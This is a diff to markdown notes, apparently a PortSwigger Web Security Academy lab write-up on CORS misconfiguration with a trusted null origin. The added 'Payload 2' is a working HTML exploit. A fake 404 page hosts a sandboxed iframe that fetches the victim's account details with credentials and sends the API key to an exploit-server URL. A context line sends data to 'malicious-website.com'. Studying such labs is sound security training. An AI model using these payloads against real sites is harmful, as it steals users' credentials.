@@ -254,7 +254,32 @@ location='malicious-website.com/log?key='+this.responseText;
 </script>"></iframe>
 ```
 
-- CORS origin with trusted null whitelist
-  
+- CORS origin with trusted null whitelist-:
+- CSRF POC-:
+
+```html
+<!--Payload 2-->
+<meta name="referrer" content="never">
+<h1>404 - Page not found</h1>
+The URL you are requesting is no longer available
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+      var req = new XMLHttpRequest();
+      req.onload = reqListener;
+      req.open('get','https://0ab300f00420f33881e289fd00e10007.web-security-academy.net/accountDetails',true);
+      req.withCredentials = true;
+      req.send();
+      
+      function reqListener() {
+      var data =  JSON.parse(this.responseText);
+      var api_key =  data.apikey;      
+      location='https://exploit-0a6100780480f311814e8889018a000e.exploit-server.net/log?key='+api_key;
+      };
+      </script>"></iframe>
+```
+
+- Proof of concept-:
+
+![image](https://github.com/user-attachments/assets/a5d3813b-f284-44a9-bf33-75ac34d8ca11)
+ 
 
 -----------
